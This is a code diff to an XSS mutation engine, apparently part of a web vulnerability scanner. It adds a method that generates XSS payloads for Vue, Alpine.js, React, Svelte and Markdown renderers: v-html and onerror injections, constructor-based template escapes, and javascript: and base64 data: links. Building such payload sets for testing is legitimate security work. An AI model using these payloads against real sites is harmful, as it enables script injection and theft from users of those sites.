@@ -1296,6 +1296,7 @@ class MutationEngine:
             # CSP Bypasses
             mutations.extend(expand(MutationEngine.apply_csp_bypass_cdn))
             mutations.extend(expand(MutationEngine.apply_csp_bypass_angular))
+            mutations.extend(expand(MutationEngine.apply_framework_directives))
             
             # Sanitizer / mXSS Bypasses
             mutations.extend(expand(MutationEngine.apply_mxss_nesting))
@@ -1362,6 +1363,27 @@ class MutationEngine:
             f"<div ng-controller=\"a\">{{{{$eval.constructor('__XSS__(\"{token}\")')()}}}}</div>",
             f"{{{{_c.constructor('__XSS__(\"{token}\")')()}}}}",
             f"<div id=\"app\">{{{{_c.constructor('__XSS__(\"{token}\")')()}}}}</div>"
+        ]
+
+    @staticmethod
+    def apply_framework_directives(payload: str) -> List[str]:
+        """Generate Vue, React, Svelte, Alpine.js, and Markdown renderer template injection and attribute bypasses."""
+        token = MutationEngine._extract_token_from_payload(payload)
+        import base64
+        b64_payload = base64.b64encode(f"<script>__XSS__('{token}')</script>".encode()).decode()
+        
+        return [
+            f"<div v-html=\"'<img src=x onerror=__XSS__(\\'{token}\\')>'\"></div>",
+            f"{{{{_setupCtx.set.constructor('__XSS__(\"{token}\")')()}}}}",
+            f"<div v-bind:id=\"'x'\" v-on:click=\"$eval('__XSS__(\"{token}\")')\">click</div>",
+            f"<div x-data=\"{{}}\" x-init=\"__XSS__('{token}')\"></div>",
+            f"<div x-data=\"{{}}\" x-text=\"__XSS__('{token}')\"></div>",
+            f"<div dangerouslySetInnerHTML={{{{'__html': '<img src=x onerror=__XSS__(\'{token}\')>'}}}} />",
+            f"{{@html '<img src=x onerror=__XSS__(\\'{token}\\')>'}}",
+            f"[link](javascript:__XSS__('{token}'))",
+            f"[link](javascript:__XSS__`{token}`)",
+            f"[link](data:text/html;base64,{b64_payload})",
+            f"![image](x\"onerror=\"__XSS__('{token}')\")",
         ]
 
     @staticmethod
